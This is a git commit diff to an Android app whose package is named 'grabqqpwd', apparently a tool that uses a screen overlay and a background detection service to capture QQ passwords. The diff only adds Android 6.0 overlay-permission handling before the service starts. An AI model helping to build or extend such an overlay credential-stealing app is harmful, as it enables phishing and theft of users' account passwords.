4cb88a7bc5475718ad8183695758ef048f097659
zhao_zepeng <zhao_zepeng@hotmail.com>
2016-04-25 20:59:54 +0800

    6.0版本权限适配

--- app/src/main/java/com/android/grabqqpwd/MainActivity.java
+++ app/src/main/java/com/android/grabqqpwd/MainActivity.java
@@ -1,9 +1,18 @@
 package com.android.grabqqpwd;
 
+import android.Manifest;
+import android.annotation.TargetApi;
 import android.app.Activity;
 import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.net.Uri;
+import android.os.Build;
 import android.os.Bundle;
+import android.provider.Settings;
+import android.support.v4.content.ContextCompat;
 import android.view.View;
+
+import java.security.Permission;
 
 /**
  * Description: #TODO
@@ -11,7 +20,7 @@ import android.view.View;
  * @author zzp(zhao_zepeng@hotmail.com)
  * @since 2016-01-07
  */
-public class MainActivity extends Activity{
+public class MainActivity extends Activity {
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -25,8 +34,27 @@ public class MainActivity extends Activity{
         stopService(new Intent(this, BackgroundDetectService.class));
     }
 
-    public void onclick(View v){
-        Intent intent = new Intent(this, BackgroundDetectService.class);
-        startService(intent);
+    public void onclick(View v) {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.SYSTEM_ALERT_WINDOW) !=
+                PackageManager.PERMISSION_GRANTED && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
+            intent.setData(Uri.parse("package:" + getPackageName()));
+            startActivityForResult(intent, 1);
+        } else {
+            Intent intent = new Intent(this, BackgroundDetectService.class);
+            startService(intent);
+        }
+    }
+
+    @TargetApi(Build.VERSION_CODES.M)
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (requestCode == 1) {
+            if (Settings.canDrawOverlays(this)) {
+                Intent intent = new Intent(this, BackgroundDetectService.class);
+                startService(intent);
+            }
+        }
     }
 }
